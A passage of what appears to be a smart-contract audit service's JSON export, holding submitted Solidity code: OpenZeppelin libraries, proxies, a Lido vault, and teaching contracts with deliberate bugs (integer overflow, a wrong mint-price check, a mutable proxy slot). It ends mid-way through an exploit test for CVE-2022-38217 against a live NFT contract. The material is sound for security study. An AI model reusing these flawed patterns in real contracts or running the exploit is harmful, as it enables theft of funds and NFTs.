avoid-low-level-calls\n        (bool success, bytes memory returndata) = target.staticcall(data);\n        return _verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n        require(isContract(target), \"Address: delegate call to non-contract\");\n\n        // solhint-disable-next-line avoid-low-level-calls\n        (bool success, bytes memory returndata) = target.delegatecall(data);\n        return _verifyCallResult(success, returndata, errorMessage);\n    }\n\n    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {\n        if (success) {\n            return returndata;\n        } else {\n            // Look for revert reason and bubble it up if present\n            if (returndata.length > 0) {\n                // The easiest way to bubble the revert reason is using memory via assembly\n\n                // solhint-disable-next-line no-inline-assembly\n                assembly {\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                }\n            } else {\n                revert(errorMessage);\n            }\n        }\n    }\n}\n\n\n// File: @openzeppelin/contracts/utils/StorageSlot.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Library for reading and writing primitive types to specific storage slots.\n *\n * Storage slots are often used to avoid storage conflict when dealing with upgradeable contracts.\n * This library helps with reading and writing to such slots without the need for inline assembly.\n *\n * The functions in this library return Slot structs that contain a `value` member that can be used to read or write.\n *\n * Example usage to set ERC1967 implementation slot:\n * ```\n * contract ERC1967 {\n *     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n *\n *     function _getImplementation() internal view returns (address) {\n *         return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;\n *     }\n *\n *     function _setImplementation(address newImplementation) internal {\n *         require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n *         StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;\n *     }\n * }\n * ```\n *\n * _Available since v4.1 for `address`, `bool`, `bytes32`, and `uint256`._\n */\nlibrary StorageSlot {\n    struct AddressSlot {\n        address value;\n    }\n\n    struct BooleanSlot {\n        bool value;\n    }\n\n    struct Bytes32Slot {\n        bytes32 value;\n    }\n\n    struct Uint256Slot {\n        uint256 value;\n    }\n\n    /**\n     * @dev Returns an `AddressSlot` with member `value` located at `slot`.\n     */\n    function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\n        assembly {\n            r.slot := slot\n        }\n    }\n\n    /**\n     * @dev Returns an `BooleanSlot` with member `value` located at `slot`.\n     */\n    function getBooleanSlot(bytes32 slot) internal pure returns (BooleanSlot storage r) {\n        assembly {\n            r.slot := slot\n        }\n    }\n\n    /**\n     * @dev Returns an `Bytes32Slot` with member `value` located at `slot`.\n     */\n    function getBytes32Slot(bytes32 slot) internal pure returns (Bytes32Slot storage r) {\n        assembly {\n            r.slot := slot\n        }\n    }\n\n    /**\n     * @dev Returns an `Uint256Slot` with member `value` located at `slot`.\n     */\n    function getUint256Slot(bytes32 slot) internal pure returns (Uint256Slot storage r) {\n        assembly {\n            r.slot := slot\n        }\n    }\n}\n\n\n// File: @openzeppelin/contracts/access/Ownable.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"../utils/Context.sol\";\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * By default, the owner account will be the one that deploys the contract. This\n * can later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\n\n\n// File: @openzeppelin/contracts/utils/Context.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/*\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n\n```\n\nPlease provide a comprehensive security audit focusing on vulnerabilities, gas optimization, and best practices.","contract_language":"solidity","status":"completed","created_at":"2025-08-30T16:38:57.897Z","completed_at":"2025-08-30T16:40:19.749Z","user_id":"126b470c-625b-4074-913b-92b0edb9d452","contract_source":"manual","github_repo_id":null,"github_file_path":null,"is_public":true,"public_title":"verified contract fetching audit","public_description":null,"tags":[],"credits_used":55,"code_complexity":10,"is_pinned":true,"is_archived":false},{"id":"6a8eb032-8b46-4062-bd5d-5d8ef3e73ab4","session_key":"05c7f2ed-760a-40ee-ac70-6486b1d83481","contract_code":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/proxy/beacon/BeaconProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol\";\nimport \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol\";\n\n// Kept for backwards compatibility with older versions of Hardhat and Truffle plugins.\ncontract AdminUpgradeabilityProxy is TransparentUpgradeableProxy {\n    constructor(address logic, address admin, bytes memory data) payable TransparentUpgradeableProxy(logic, admin, data) {}\n}\n","contract_language":"solidity","status":"pending","created_at":"2025-08-30T16:31:53.129Z","completed_at":null,"user_id":null,"contract_source":"live-scan","github_repo_id":null,"github_file_path":null,"is_public":true,"public_title":"Live Scan: ERC1967Proxy","public_description":"Automated security analysis of ERC1967Proxy contract from ethereum network","tags":["live-scan","ethereum","unknown"],"credits_used":0,"code_complexity":1,"is_pinned":false,"is_archived":false},{"id":"6aa20a68-6501-4a2a-a178-c752dec20c50","session_key":"ccd2e01d-9559-49a3-bf66-43c8d0027acd","contract_code":"\n// File: src/test/Invariant.sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.7.0;\n// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Invariant issue\n\nDescription:\nAssert is used to check invariants. Those are states our contract or variables should never reach, ever. For example,\nif we decrease a value then it should never get bigger, only smaller.\n\nIn the given code, the Invariant contract contains a receiveMoney function that accepts Ether and \nincrements the sender's balance with the amount received. This balance is stored as an uint64.\nUnsigned integers can store values from 0 to 2^n - 1, so in this case 2^64 - 1, or roughly 18.4467 Ether.\n\nIf the sender sends more Ether than the maximum that can be stored in an uint64, \nan overflow occurs, and the value rolls over to 0 and starts incrementing from there. \nAs a result, the balance does not accurately reflect the amount of Ether received by the contract.\n\nMitigation:\nTo avoid this problem, it's important to ensure that the types you use for storing values \nare appropriately sized for the values they need to store.\n\nREF:\nhttps://ethereum-blockchain-developer.com/027-exceptions/04-invariants-with-assert/\n\n*/\n\n\ncontract ContractTest is Test {\n    Invariant InvariantContract;\n\n    function testInvariant() public {\n        InvariantContract = new Invariant();\n        InvariantContract.receiveMoney{value: 1 ether}();\n        console.log(\n            \"BalanceReceived:\",\n            InvariantContract.balanceReceived(address(this))\n        );\n\n        InvariantContract.receiveMoney{value: 18 ether}();\n        console.log(\n            \"testInvariant, BalanceReceived:\",\n            InvariantContract.balanceReceived(address(this))\n        );\n        /*\nThat's only 553255926290448384 Wei, or around 0.553 Ether. Where is the rest? What happened?\n\nWe are storing the balance in an uint64. Unsigned integers go from 0 to 2^n-1, \nso that's 2^64-1 or 18446744073709551615. So, it can store a max of 18.4467... \nEther. We sent 19 Ether to the contract. \nIt automatically rolls over to 0. So, we end up with 19000000000000000000 - 18446744073709551615 -1 (the 0 value) = 553255926290448384.\n*/\n    }\n\n    receive() external payable {}\n}\n\ncontract Invariant {\n    mapping(address => uint64) public balanceReceived;\n\n    function receiveMoney() public payable {\n        balanceReceived[msg.sender] += uint64(msg.value);\n    }\n\n    function withdrawMoney(address payable _to, uint64 _amount) public {\n        require(\n            _amount <= balanceReceived[msg.sender],\n            \"Not Enough Funds, aborting\"\n        );\n\n        balanceReceived[msg.sender] -= _amount;\n        _to.transfer(_amount);\n    }\n}\n\n\n","contract_language":"solidity","status":"completed","created_at":"2025-08-29T08:26:34.293Z","completed_at":"2025-08-29T08:28:17.942Z","user_id":"126b470c-625b-4074-913b-92b0edb9d452","contract_source":"manual","github_repo_id":null,"github_file_path":null,"is_public":false,"public_title":null,"public_description":null,"tags":["github","repository","DeFiVulnLabs1demo"],"credits_used":21,"code_complexity":3,"is_pinned":false,"is_archived":false},{"id":"7b74cc1e-08bb-4596-ba77-54b6748eec43","session_key":"ba7ac47c-79c0-44bb-8093-5c09c1887321","contract_code":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/proxy/beacon/BeaconProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol\";\nimport \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol\";\n\n// Kept for backwards compatibility with older versions of Hardhat and Truffle plugins.\ncontract AdminUpgradeabilityProxy is TransparentUpgradeableProxy {\n    constructor(address logic, address admin, bytes memory data) payable TransparentUpgradeableProxy(logic, admin, data) {}\n}\n","contract_language":"solidity","status":"pending","created_at":"2025-08-30T16:27:19.356Z","completed_at":null,"user_id":null,"contract_source":"live-scan","github_repo_id":null,"github_file_path":null,"is_public":true,"public_title":"Live Scan: ERC1967Proxy","public_description":"Automated security analysis of ERC1967Proxy contract from ethereum network","tags":["live-scan","ethereum","unknown"],"credits_used":0,"code_complexity":1,"is_pinned":false,"is_archived":false},{"id":"9b3e50ce-c985-4b5e-8bd4-3e415be28387","session_key":"5b8a390b-815b-4075-848f-81919e924a7f","contract_code":"// SPDX-FileCopyrightText: 2021 Lido <info@lido.fi>\n\n// SPDX-License-Identifier: GPL-3.0\n\n/* See contracts/COMPILERS.md */\npragma solidity 0.8.9;\n\nimport \"@openzeppelin/contracts-v4.4/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts-v4.4/token/ERC721/IERC721.sol\";\nimport \"@openzeppelin/contracts-v4.4/token/ERC20/utils/SafeERC20.sol\";\n\ninterface ILido {\n    /**\n      * @notice A payable function supposed to be called only by LidoExecLayerRewardsVault contract\n      * @dev We need a dedicated function because funds received by the default payable function\n      * are treated as a user deposit\n      */\n    function receiveELRewards() external payable;\n}\n\n\n/**\n * @title A vault for temporary storage of execution layer rewards (MEV and tx priority fee)\n */\ncontract LidoExecutionLayerRewardsVault {\n    using SafeERC20 for IERC20;\n\n    address public immutable LIDO;\n    address public immutable TREASURY;\n\n    /**\n      * Emitted when the ERC20 `token` recovered (i.e. transferred)\n      * to the Lido treasury address by `requestedBy` sender.\n      */\n    event ERC20Recovered(\n        address indexed requestedBy,\n        address indexed token,\n        uint256 amount\n    );\n\n    /**\n      * Emitted when the ERC721-compatible `token` (NFT) recovered (i.e. transferred)\n      * to the Lido treasury address by `requestedBy` sender.\n      */\n    event ERC721Recovered(\n        address indexed requestedBy,\n        address indexed token,\n        uint256 tokenId\n    );\n\n    /**\n      * Emitted when the vault received ETH\n      */\n    event ETHReceived(\n        uint256 amount\n    );\n\n    /**\n      * Ctor\n      *\n      * @param _lido the Lido token (stETH) address\n      * @param _treasury the Lido treasury address (see ERC20/ERC721-recovery interfaces)\n      */\n    constructor(address _lido, address _treasury) {\n        require(_lido != address(0), \"LIDO_ZERO_ADDRESS\");\n        require(_treasury != address(0), \"TREASURY_ZERO_ADDRESS\");\n\n        LIDO = _lido;\n        TREASURY = _treasury;\n    }\n\n    /**\n      * @notice Allows the contract to receive ETH\n      * @dev execution layer rewards may be sent as plain ETH transfers\n      */\n    receive() external payable {\n        emit ETHReceived(msg.value);\n    }\n\n    /**\n      * @notice Withdraw all accumulated rewards to Lido contract\n      * @dev Can be called only by the Lido contract\n      * @param _maxAmount Max amount of ETH to withdraw\n      * @return amount of funds received as execution layer rewards (in wei)\n      */\n    function withdrawRewards(uint256 _maxAmount) external returns (uint256 amount) {\n        require(msg.sender == LIDO, \"ONLY_LIDO_CAN_WITHDRAW\");\n\n        uint256 balance = address(this).balance;\n        amount = (balance > _maxAmount) ? _maxAmount : balance;\n        if (amount > 0) {\n            ILido(LIDO).receiveELRewards{value: amount}();\n        }\n        return amount;\n    }\n\n    /**\n      * Transfers a given `_amount` of an ERC20-token (defined by the `_token` contract address)\n      * currently belonging to the burner contract address to the Lido treasury address.\n      *\n      * @param _token an ERC20-compatible token\n      * @param _amount token amount\n      */\n    function recoverERC20(address _token, uint256 _amount) external {\n        require(_amount > 0, \"ZERO_RECOVERY_AMOUNT\");\n\n        emit ERC20Recovered(msg.sender, _token, _amount);\n\n        IERC20(_token).safeTransfer(TREASURY, _amount);\n    }\n\n    /**\n      * Transfers a given token_id of an ERC721-compatible NFT (defined by the token contract address)\n      * currently belonging to the burner contract address to the Lido treasury address.\n      *\n      * @param _token an ERC721-compatible token\n      * @param _tokenId minted token id\n      */\n    function recoverERC721(address _token, uint256 _tokenId) external {\n        emit ERC721Recovered(msg.sender, _token, _tokenId);\n\n        IERC721(_token).transferFrom(address(this), TREASURY, _tokenId);\n    }\n}\n","contract_language":"solidity","status":"pending","created_at":"2025-08-30T16:10:49.564Z","completed_at":null,"user_id":null,"contract_source":"live-scan","github_repo_id":null,"github_file_path":null,"is_public":true,"public_title":"Live Scan: LidoExecutionLayerRewardsVault","public_description":"Automated security analysis of LidoExecutionLayerRewardsVault contract from ethereum network","tags":["live-scan","ethereum","unknown"],"credits_used":0,"code_complexity":1,"is_pinned":false,"is_archived":false},{"id":"9b7f5598-e947-40c6-99b6-2e48ae1b6be7","session_key":"5bb3f3dc-98de-4259-b1c4-05fee0c9dcbb","contract_code":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/proxy/beacon/BeaconProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol\";\nimport \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol\";\n\n// Kept for backwards compatibility with older versions of Hardhat and Truffle plugins.\ncontract AdminUpgradeabilityProxy is TransparentUpgradeableProxy {\n    constructor(address logic, address admin, bytes memory data) payable TransparentUpgradeableProxy(logic, admin, data) {}\n}\n","contract_language":"solidity","status":"pending","created_at":"2025-08-30T16:17:52.716Z","completed_at":null,"user_id":null,"contract_source":"live-scan","github_repo_id":null,"github_file_path":null,"is_public":true,"public_title":"Live Scan: ERC1967Proxy","public_description":"Automated security analysis of ERC1967Proxy contract from ethereum network","tags":["live-scan","ethereum","unknown"],"credits_used":0,"code_complexity":1,"is_pinned":false,"is_archived":false},{"id":"9cd7f35e-e465-441c-b051-22e06869f37a","session_key":"17ddb2e6-97e1-41f3-a130-084fcd546dbe","contract_code":"\n// File: src/test/Immunefi_ch1.sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/utils/Counters.sol\";\n\n// Immunefi #spotthebugchallenge!\n// https://twitter.com/immunefi/status/1557301712549023745\n\ncontract ContractTest is Test {\n    HerToken HerTokenContract;\n\n    function testSafeMint() public {\n        HerTokenContract = new HerToken();\n\n        HerTokenContract.safeMint{value: 1 ether}(address(this), 10);\n        console.log(\n            \"Due to incorrect check msg.value, we can mint many NFTs with 1 Eth.\"\n        );\n        console.log(\"NFT minted:\", HerTokenContract.balanceOf(address(this)));\n    }\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) public returns (bytes4) {\n        //   HerTokenContract.safeMint{value: 1 ether}(address(this),30);\n        return this.onERC721Received.selector;\n    }\n\n    receive() external payable {}\n}\n\ncontract HerToken is ERC721, Ownable, Test {\n    uint128 constant MINT_PRICE = 1 ether;\n    uint128 constant MAX_SUPPLY = 10000;\n    uint mintIndex;\n    using Counters for Counters.Counter;\n    Counters.Counter private _tokenIdCounter;\n\n    constructor() payable ERC721(\"HarToken\", \"HRT\") {}\n\n    function safeMint(address to, uint256 amount) public payable {\n        require(\n            _tokenIdCounter.current() + amount < MAX_SUPPLY,\n            \"Cannot mint given amount.\"\n        );\n        require(amount > 0, \"Must give a mint amount.\");\n        //fix require(msg.value >= MINT_PRICE * amount, \"Insufficient Ether.\");\n        // before the loop\n        for (uint256 i = 0; i < amount; i++) {\n            require(msg.value >= MINT_PRICE, \"Insufficient Ether.\");\n\n            mintIndex = _tokenIdCounter.current();\n            console.log(\"mintIndex\", mintIndex);\n            _safeMint(to, mintIndex); // no reentrancy issue, because we can not control tokenid.\n            _tokenIdCounter.increment();\n        }\n    }\n}\n\n\n","contract_language":"solidity","status":"completed","created_at":"2025-08-29T08:12:06.351Z","completed_at":"2025-08-29T08:13:58.667Z","user_id":"126b470c-625b-4074-913b-92b0edb9d452","contract_source":"manual","github_repo_id":null,"github_file_path":null,"is_public":false,"public_title":null,"public_description":null,"tags":["github","repository","DeFiVulnLabs1demo"],"credits_used":21,"code_complexity":3,"is_pinned":false,"is_archived":false},{"id":"9e73ee47-7578-4b33-9783-ba5f31b5c85f","session_key":"509ba611-7c5e-4cd1-b95d-860ba15663b9","contract_code":"// File: 1755917082329_immunefi_ch1.sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/utils/Counters.sol\";\n\n// Immunefi #spotthebugchallenge!\n// https://twitter.com/immunefi/status/1557301712549023745\n\ncontract ContractTest is Test {\n    HerToken HerTokenContract;\n\n    function testSafeMint() public {\n        HerTokenContract = new HerToken();\n\n        HerTokenContract.safeMint{value: 1 ether}(address(this), 10);\n        console.log(\n            \"Due to incorrect check msg.value, we can mint many NFTs with 1 Eth.\"\n        );\n        console.log(\"NFT minted:\", HerTokenContract.balanceOf(address(this)));\n    }\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) public returns (bytes4) {\n        //   HerTokenContract.safeMint{value: 1 ether}(address(this),30);\n        return this.onERC721Received.selector;\n    }\n\n    receive() external payable {}\n}\n\ncontract HerToken is ERC721, Ownable, Test {\n    uint128 constant MINT_PRICE = 1 ether;\n    uint128 constant MAX_SUPPLY = 10000;\n    uint mintIndex;\n    using Counters for Counters.Counter;\n    Counters.Counter private _tokenIdCounter;\n\n    constructor() payable ERC721(\"HarToken\", \"HRT\") {}\n\n    function safeMint(address to, uint256 amount) public payable {\n        require(\n            _tokenIdCounter.current() + amount < MAX_SUPPLY,\n            \"Cannot mint given amount.\"\n        );\n        require(amount > 0, \"Must give a mint amount.\");\n        //fix require(msg.value >= MINT_PRICE * amount, \"Insufficient Ether.\");\n        // before the loop\n        for (uint256 i = 0; i < amount; i++) {\n            require(msg.value >= MINT_PRICE, \"Insufficient Ether.\");\n\n            mintIndex = _tokenIdCounter.current();\n            console.log(\"mintIndex\", mintIndex);\n            _safeMint(to, mintIndex); // no reentrancy issue, because we can not control tokenid.\n            _tokenIdCounter.increment();\n        }\n    }\n}\n","contract_language":"solidity","status":"completed","created_at":"2025-08-28T10:51:12.846Z","completed_at":"2025-08-28T10:53:55.333Z","user_id":"126b470c-625b-4074-913b-92b0edb9d452","contract_source":"manual","github_repo_id":null,"github_file_path":null,"is_public":false,"public_title":"test credits2","public_description":null,"tags":[],"credits_used":21,"code_complexity":3,"is_pinned":false,"is_archived":false},{"id":"cce7acb8-c233-473b-a500-0b8e8da1ae56","session_key":"f3333ef5-dd38-41ed-a9b5-fef8e9ccddf5","contract_code":"// File: Immunefi_ch2.sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/utils/StorageSlot.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\n//#SpotTheBugChallenge\n//https://twitter.com/immunefi/status/1562858386244665348?s=21&t=d7_HtNra5AGuNmzVtv9uKg\ninterface imp {\n    function initialize(address) external;\n}\n\ncontract ContractTest is Test {\n    Proxy ProxyContract;\n    Implementation ImplementationContract;\n\n    function testChallenge() public {\n        ImplementationContract = new Implementation();\n        console.log(\n            \"ImplementationContract addr\",\n            address(ImplementationContract)\n        );\n        ProxyContract = new Proxy(address(ImplementationContract));\n\n        emit log_named_bytes32(\n            \"Storage slot 0:\",\n            vm.load(address(ProxyContract), bytes32(uint256(0)))\n        );\n    }\n}\n\ncontract Proxy {\n    //bytes32 constant internal _IMPLEMENTATION_SLOT = keccak256(\"where.bug.ser\");  //correct pattern.\n    bytes32 internal _IMPLEMENTATION_SLOT = keccak256(\"where.bug.ser\"); // wrong\n\n    constructor(address implementation) {\n        _setImplementation(address(0));\n        Address.functionDelegateCall(\n            implementation,\n            abi.encodeWithSignature(\"initialize(address)\", msg.sender)\n        );\n    }\n\n    fallback() external payable {\n        address implementation = _getImplementation();\n        Address.functionDelegateCall(implementation, msg.data);\n    }\n\n    function _setImplementation(address newImplementation) private {\n        //require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n        StorageSlot\n            .getAddressSlot(_IMPLEMENTATION_SLOT)\n            .value = newImplementation;\n    }\n\n    function _getImplementation() public view returns (address) {\n        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;\n    }\n}\n\ncontract Implementation is Ownable, Initializable {\n    // function initialize(address owner) external {    //test purpose\n    function initialize(address owner) external initializer {\n        _transferOwnership(owner);\n    }\n}\n","contract_language":"solidity","status":"completed","created_at":"2025-08-28T07:02:33.056Z","completed_at":"2025-08-28T07:04:42.295Z","user_id":"126b470c-625b-4074-913b-92b0edb9d452","contract_source":"manual","github_repo_id":null,"github_file_path":null,"is_public":false,"public_title":"archive","public_description":null,"tags":[],"credits_used":0,"code_complexity":1,"is_pinned":false,"is_archived":true},{"id":"d442548d-8792-40b3-8399-010d0ff2a44e","session_key":"67a5f5c1-e5c8-4928-aac7-e715ad853b8e","contract_code":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/proxy/beacon/BeaconProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol\";\nimport \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol\";\n\n// Kept for backwards compatibility with older versions of Hardhat and Truffle plugins.\ncontract AdminUpgradeabilityProxy is TransparentUpgradeableProxy {\n    constructor(address logic, address admin, bytes memory data) payable TransparentUpgradeableProxy(logic, admin, data) {}\n}\n","contract_language":"solidity","status":"pending","created_at":"2025-08-30T16:16:28.724Z","completed_at":null,"user_id":null,"contract_source":"live-scan","github_repo_id":null,"github_file_path":null,"is_public":true,"public_title":"Live Scan: ERC1967Proxy","public_description":"Automated security analysis of ERC1967Proxy contract from ethereum network","tags":["live-scan","ethereum","unknown"],"credits_used":0,"code_complexity":1,"is_pinned":false,"is_archived":false},{"id":"dcc8cf3d-20af-4702-b321-a5f5570c036f","session_key":"ab8aee21-7638-42b3-98fb-16442bdf4594","contract_code":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/proxy/beacon/BeaconProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol\";\nimport \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol\";\n\n// Kept for backwards compatibility with older versions of Hardhat and Truffle plugins.\ncontract AdminUpgradeabilityProxy is TransparentUpgradeableProxy {\n    constructor(address logic, address admin, bytes memory data) payable TransparentUpgradeableProxy(logic, admin, data) {}\n}\n","contract_language":"solidity","status":"pending","created_at":"2025-08-30T16:21:57.617Z","completed_at":null,"user_id":null,"contract_source":"live-scan","github_repo_id":null,"github_file_path":null,"is_public":true,"public_title":"Live Scan: ERC1967Proxy","public_description":"Automated security analysis of ERC1967Proxy contract from ethereum network","tags":["live-scan","ethereum","unknown"],"credits_used":0,"code_complexity":1,"is_pinned":false,"is_archived":false},{"id":"fe875924-14e1-457e-be51-c1e0985ee855","session_key":"ea31e3c7-b506-414c-b897-9cef4dc843b6","contract_code":"// File: NFTMint_exposedMetadata.sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\nName: NFT Mint via Exposed Metadata Vulnerability\n\nDescription:\nThe contract is vulnerable to CVE-2022-38217, this could lead to the early disclosure of metadata of all NFTs in the project. \nAs a result, attacker can find out valuable NFTs and then target mint of specific NFTs by monitoring mempool \nand sell the NFTs for a profit in secondary market.\n\nThe issue is the metadata should be visible after the minting is completed\n\nREF:\nhttps://twitter.com/Supremacy_CA/status/1596176732729769985\nhttps://medium.com/@Supremacy_Official/evilreveal-cve-2022-38217-a-nuclear-weapon-level-generic-vulnerability-buried-under-the-nft-5112724dabb\n*/\n \n\ncontract ContractTest is DSTest {\n    IFantasticWeslie nftContract =\n        IFantasticWeslie(0xf6FFBa463e46087FcdC3a51391bB675B0e2C1a40); // Fantastic Weslie\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    bytes32[] merkleTreeProof;\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16023847);\n    }\n\n    function testExploit() public {\n        //Since the contract is vulnerable to CVE-2022-38217\n        //it could lead to the early disclosure of metadata of all NFTs in the project\n        //As a result, attacker can find out valuable NFTs and then target mint specified NFTs by monitoring Mempool and sell the NFTs for a profit in secondary market\n\n        //For example, Lets assume the attacker finds out that NFT#142 is a rare NFT, now he just has to moniter the mempool till NFT#141 is minted and then mint NFT#142\n        //View Metadata of the NFTs via cURL -> curl -k https://bafybeic23x4v75z7isyqhy5p6ylzqutm6lnpobwngaouovdu6qjjvt4wpu.ipfs.dweb.link/142.json\n        //The issue is the metadata should be visible after the minting is completed\n\n        //etherscan tx - 0xfa4434236d2a9717e3410d7cdc60eed6acfddb054f58bc779c07349a1f45ce6b\n        //etherscan tx - 0x24af97355f6cec4ae02fff8bbf7144a02857e3ffd36a650aa295c62f6272cc83\n\n        address attacker = 0x1fCebBb5D3EACd26e70b0BD1E54a979a479906aA;\n        cheats.prank(attacker);\n\n        merkleTreeProof.push(\n            0x0ea49bae9ab4f8b82fb0e0b5e876576c9a4a945edc2fa5a7b448fad470802ae6\n        );\n        merkleTreeProof.push(\n            0x852233af3700b87dc51f6abf53d4f935746d746d84a33d4d7e6302d9c110fedd\n        );\n        merkleTreeProof.push(\n            0x5de513269badb3a0b73e237a9f28f86994791f4421effd1865df975a0f8ee52c\n        );\n        merkleTreeProof.push(\n            0xe52d780f15394a8f6254f328ca06a66909c41f1ee3adab33d02cd087f8c37604\n        );\n        